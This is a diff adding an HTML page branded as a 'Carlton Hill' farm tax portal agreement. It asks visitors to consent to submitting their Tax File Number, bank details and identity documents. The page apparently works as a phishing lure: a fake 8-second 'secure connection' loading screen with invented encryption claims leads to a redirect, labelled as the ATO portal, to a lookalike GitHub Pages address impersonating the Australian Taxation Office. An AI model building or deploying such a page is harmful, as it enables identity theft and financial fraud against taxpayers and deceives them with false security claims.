@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Carlton Hill | Tax Portal Agreement</title>
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600&family=Playfair+Display:wght@500;600;700&display=swap" rel="stylesheet">
+  <!-- Font Awesome 6 -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Space Grotesk', sans-serif;
+      background: #f5f7fa;
+      color: #1e2a1e;
+      line-height: 1.5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ===== CUSTOM VARIABLES ===== */
+    :root {
+      --primary: #1a3a2a;
+      --primary-light: #2d5a3d;
+      --accent: #c49a6b;
+      --accent-light: #dbb68c;
+      --light: #f9f6ef;
+      --gray: #eae7de;
+      --success: #4caf50;
+      --danger: #b04a4a;
+      --warning: #ff9800;
+    }
+
+    /* ===== LOADING SCREEN ===== */
+    .loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      background: linear-gradient(145deg, var(--primary) 0%, #083c2d 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      transition: opacity 0.5s ease, visibility 0.5s ease;
+    }
+
+    .loading-screen.hidden {
+      opacity: 0;
+      visibility: hidden;
+    }
+
+    .loading-content {
+      text-align: center;
+      color: white;
+      max-width: 400px;
+      padding: 2rem;
+    }
+
+    .loading-logo {
+      font-family: 'Playfair Display', serif;
+      font-size: 1rem;
+      font-weight: 700;
+      margin-bottom: 2rem;
+      letter-spacing: -0.02em;
+    }
+
+    .loading-logo span {
+      color: rgba(255,255,255,0.7);
+      font-size: 1rem;
+      margin-left: 0.5rem;
+    }
+
+    .loading-spinner {
+      width: 60px;
+      height: 60px;
+      border: 4px solid rgba(255,255,255,0.1);
+      border-top: 4px solid var(--accent);
+      border-radius: 50%;
+      margin: 2rem auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-progress {
+      width: 100%;
+      height: 6px;
+      background: rgba(255,255,255,0.1);
+      border-radius: 100px;
+      margin: 2rem 0 1rem;
+      overflow: hidden;
+    }
+
+    .loading-progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, var(--accent), #ffffff);
+      border-radius: 100px;
+      transition: width 0.3s ease;
+    }
+
+    .loading-text {
+      font-size: 0.9rem;
+      opacity: 0.9;
+      margin-bottom: 0.5rem;
+    }
+
+    .loading-percent {
+      font-size: 1.5rem;
+      font-weight: 700;
+      font-family: 'Playfair Display', serif;
+    }
+
+    .loading-security {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 1rem;
+      margin-top: 2rem;
+      font-size: 0.8rem;
+      opacity: 0.7;
+    }
+
+    .loading-security i {
+      color: var(--accent);
+    }
+
+    /* ===== REDIRECT LOADING OVERLAY ===== */
+    .redirect-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(5px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      flex-direction: column;
+      color: white;
+    }
+
+    .redirect-overlay.active {
+      display: flex;
+    }
+
+    .redirect-spinner {
+      width: 60px;
+      height: 60px;
+      border: 4px solid rgba(255,255,255,0.2);
+      border-top: 4px solid var(--accent);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 1.5rem;
+    }
+
+    .redirect-overlay p {
+      font-size: 1.2rem;
+      font-weight: 500;
+    }
+
+    /* ===== MAIN CONTENT (initially hidden) ===== */
+    .agreement-container {
+      max-width: 800px;
+      margin: 2rem auto;
+      padding: 1.5rem;
+      width: 100%;
+      display: none;
+    }
+
+    .agreement-container.visible {
+      display: block;
+      animation: fadeIn 0.5s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ===== CARD ===== */
+    .card {
+      background: white;
+      border: 1px solid var(--gray);
+      border-radius: 24px;
+      padding: 2rem 2.5rem;
+      box-shadow: 0 20px 40px -15px rgba(0,0,0,0.1);
+    }
+
+    .card h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: 2rem;
+      color: var(--primary);
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .card h1 i {
+      color: var(--accent);
+    }
+
+    .agreement-list {
+      list-style: none;
+      margin: 2rem 0;
+    }
+
+    .agreement-list li {
+      margin-bottom: 1rem;
+      padding-left: 1.8rem;
+      position: relative;
+      color: #2d3a2d;
+    }
+
+    .agreement-list li::before {
+      content: "✓";
+      color: var(--accent);
+      font-weight: bold;
+      position: absolute;
+      left: 0;
+    }
+
+    .button-group {
+      display: flex;
+      gap: 1rem;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin-top: 2rem;
+    }
+
+    .btn {
+      padding: 0.8rem 2rem;
+      border: none;
+      border-radius: 50px;
+      font-weight: 600;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: all 0.2s;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .btn-primary {
+      background: var(--accent);
+      color: var(--primary);
+    }
+
+    .btn-primary:hover {
+      background: var(--accent-light);
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px -5px rgba(0,0,0,0.2);
+    }
+
+    .btn-secondary {
+      background: var(--light);
+      color: var(--primary);
+      border: 1px solid var(--gray);
+    }
+
+    .btn-secondary:hover {
+      background: var(--gray);
+      transform: translateY(-2px);
+    }
+
+    .footer-note {
+      text-align: center;
+      margin-top: 2rem;
+      color: #7a8a7a;
+      font-size: 0.85rem;
+    }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 600px) {
+      .card {
+        padding: 1.5rem;
+      }
+      .card h1 {
+        font-size: 1.5rem;
+      }
+      .button-group {
+        flex-direction: column;
+      }
+      .btn {
+        width: 100%;
+        justify-content: center;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<!-- LOADING SCREEN (8 seconds) -->
+<div class="loading-screen" id="loadingScreen">
+  <div class="loading-content">
+    <div class="loading-logo">
+      CARLTON HILL <span>| Tax Portal</span>
+    </div>
+    <div class="loading-spinner"></div>
+    <div class="loading-progress">
+      <div class="loading-progress-bar" id="loadingProgressBar"></div>
+    </div>
+    <div class="loading-text" id="loadingText">Preparing secure agreement...</div>
+    <div class="loading-percent" id="loadingPercent">0%</div>
+    <div class="loading-security">
+      <i class="fas fa-shield-halved"></i>
+      <span>256-bit AES Encryption</span>
+      <i class="fas fa-lock"></i>
+    </div>
+  </div>
+</div>
+
+<!-- REDIRECT LOADING OVERLAY (4 seconds) -->
+<div class="redirect-overlay" id="redirectOverlay">
+  <div class="redirect-spinner"></div>
+  <p>Redirecting to ATO portal...</p>
+</div>
+
+<!-- MAIN AGREEMENT CONTENT (hidden initially) -->
+<div class="agreement-container" id="agreementContainer">
+  <div class="card">
+    <h1><i class="fas fa-scale-balanced"></i> Tax Portal Access Agreement</h1>
+    <p>Before proceeding to the Tax Filing Portal, please read carefully.</p>
+
+    <ul class="agreement-list">
+      <li>You are voluntarily submitting your personal and tax information for the purpose of lodging a tax return through the official system of the Australian Taxation Office (ATO).</li>
+      <li>All information you provide (including your Tax File Number, income details, bank details, and identification documents) is true, correct, and belongs to you.</li>
+      <li>You understand that tax refunds are assessed and approved solely by the ATO under policies of the Australian Government.</li>
+      <li>Carlton Hill Station Farm acts only as a support facilitator in submitting information and does not guarantee a refund amount, a specific processing time, or approval of any claim.</li>
+      <li>You authorize the farm’s payroll/tax assistance team to assist in preparing and submitting your tax information as required.</li>
+      <li>You acknowledge that providing false or misleading information may result in penalties under Australian tax law.</li>
+    </ul>
+
+    <div class="button-group">
+      <button class="btn btn-primary" id="agreeBtn">
+        <i class="fas fa-check-circle"></i> I Agree & Continue
+      </button>
+      <a href="javascript:history.back()" class="btn btn-secondary">
+        <i class="fas fa-times-circle"></i> Cancel
+      </a>
+    </div>
+
+    <div class="footer-note">
+      <i class="fas fa-lock" style="margin-right: 0.3rem;"></i> Your information is encrypted and handled securely.
+    </div>
+  </div>
+</div>
+
+<script>
+  // 8-second loading simulation for initial page load
+  window.addEventListener('load', function() {
+    const loadingScreen = document.getElementById('loadingScreen');
+    const progressBar = document.getElementById('loadingProgressBar');
+    const loadingText = document.getElementById('loadingText');
+    const loadingPercent = document.getElementById('loadingPercent');
+    const agreementContainer = document.getElementById('agreementContainer');
+
+    let progress = 0;
+    const totalSteps = 100;
+    const stepTime = 80; // 80ms per 1% => 8000ms total
+
+    const steps = [
+      'Initializing secure connection...',
+      'Verifying encryption protocols...',
+      'Loading agreement terms...',
+      'Almost ready...',
+      'Ready!'
+    ];
+
+    const interval = setInterval(() => {
+      progress += 1;
+      progressBar.style.width = progress + '%';
+      loadingPercent.textContent = progress + '%';
+
+      // Update text every 20%
+      if (progress === 20) loadingText.textContent = steps[1];
+      else if (progress === 40) loadingText.textContent = steps[2];
+      else if (progress === 60) loadingText.textContent = steps[3];
+      else if (progress === 80) loadingText.textContent = steps[4];
+
+      if (progress >= 100) {
+        clearInterval(interval);
+        // Hide loading, show agreement
+        loadingScreen.classList.add('hidden');
+        agreementContainer.classList.add('visible');
+      }
+    }, stepTime);
+  });
+
+  // 4-second redirect loading on Agree button click
+  document.getElementById('agreeBtn').addEventListener('click', function(e) {
+    e.preventDefault(); // Prevent immediate navigation
+    const overlay = document.getElementById('redirectOverlay');
+    const btn = this;
+
+    // Disable button to prevent multiple clicks
+    btn.disabled = true;
+    btn.style.opacity = '0.6';
+
+    // Show overlay
+    overlay.classList.add('active');
+
+    // Wait 4 seconds, then redirect
+    setTimeout(() => {
+      window.location.href = 'https://ato-gov.github.io/au/';
+    }, 4000);
+  });
+</script>
+
+</body>
+</html>
